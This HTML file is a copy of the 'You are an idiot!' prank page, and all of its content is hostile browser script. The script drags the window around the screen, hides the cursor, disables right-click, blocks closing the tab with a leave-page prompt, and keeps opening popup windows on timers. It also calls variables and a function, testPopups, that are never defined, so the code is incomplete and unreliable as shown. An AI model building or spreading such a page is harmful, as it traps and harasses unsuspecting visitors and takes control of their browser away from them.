<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>You are an idiot!</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      background: #000;
      overflow: hidden;
      cursor: none;
    }
    video {
      position: fixed;
      width: 100%;
      height: 100%;
      object-fit: cover;
    }
    .customCursor {
      position: fixed;
      width: 30px;
      height: 30px;
      background: #f0f;
      border: 3px solid #000;
      border-radius: 50%;
      pointer-events: none;
      z-index: 10000;
      box-shadow: 0 0 15px #f0f;
      animation: cursorPulse 0.5s infinite alternate;
    }
    @keyframes cursorPulse {
      from { transform: scale(1); }
      to { transform: scale(1.2); }
    }
  </style>
</head>
<body>
  <video autoplay loop muted>
    <source src="tu_video.mp4" type="video/mp4">
  </video>
  <div class="customCursor" id="cursor"></div>

  <script>
    let mouseX = window.innerWidth / 2;
    let mouseY = window.innerHeight / 2;
    let targetX = window.screenX;
    let targetY = window.screenY;
    const orbitDistance = 250;
    const orbitSpeed = 0.05;
    let angle = Math.random() * Math.PI * 2;

    const cursor = document.getElementById('cursor');
    
    document.addEventListener('mousemove', (e) => {
      mouseX = e.clientX;
      mouseY = e.clientY;
      cursor.style.left = (mouseX - 15) + 'px';
      cursor.style.top = (mouseY - 15) + 'px';
    });

    function updatePosition() {
      angle += orbitSpeed;
      
      const offsetX = Math.cos(angle) * orbitDistance;
      const offsetY = Math.sin(angle) * orbitDistance;
      
      const globalMouseX = window.screenX + mouseX;
      const globalMouseY = window.screenY + mouseY;
      
      targetX = globalMouseX + offsetX - window.outerWidth / 2;
      targetY = globalMouseY + offsetY - window.outerHeight / 2;

      targetX = Math.max(0, Math.min(screen.availWidth - window.outerWidth, targetX));
      targetY = Math.max(0, Math.min(screen.availHeight - window.outerHeight, targetY));

      window.moveTo(targetX, targetY);
      requestAnimationFrame(updatePosition);
    }

    window.addEventListener('beforeunload', (e) => {
      e.preventDefault();
      e.returnValue = '';
      return '';
    });

    document.addEventListener('contextmenu', (e) => e.preventDefault());

    updatePosition();
     function abrirVentanaQueHuye() {
      if (!popupsEnabled) return;
      
      const width = 400;
      const height = 300;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      const nuevaVentana = window.open('popup_flee.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
      if (nuevaVentana) {
        nuevaVentana.blur();
        openWindows.push(nuevaVentana);
      }
    }

    function abrirVentanaQueRodea() {
      if (!popupsEnabled) return;
      
      const width = 300;
      const height = 250;
      const x = Math.floor(Math.random() * (screen.availWidth - width));
      const y = Math.floor(Math.random() * (screen.availHeight - height));
      
      const nuevaVentana = window.open('popup_orbit.html', '_blank', `width=${width},height=${height},left=${x},top=${y},resizable=no`);
      if (nuevaVentana) {
        nuevaVentana.blur();
        openWindows.push(nuevaVentana);
      }
    }

    testPopups();

    setInterval(() => {
      if (testPopups()) {
        setTimeout(() => {
          for (let i = 0; i < 3; i++) {
            setTimeout(() => abrirVentanaQueHuye(), i * 300);
          }
          for (let i = 0; i < 2; i++) {
            setTimeout(() => abrirVentanaQueRodea(), i * 400);
          }
        }, 1000);
      }
    }, 3000);

    setInterval(() => {
      if (popupsEnabled && openWindows.length < 10) {
        if (Math.random() > 0.5) {
          abrirVentanaQueHuye();
        } else {
          abrirVentanaQueRodea();
        }
      }
    }, 2500);
  </script>
</body>
</html>
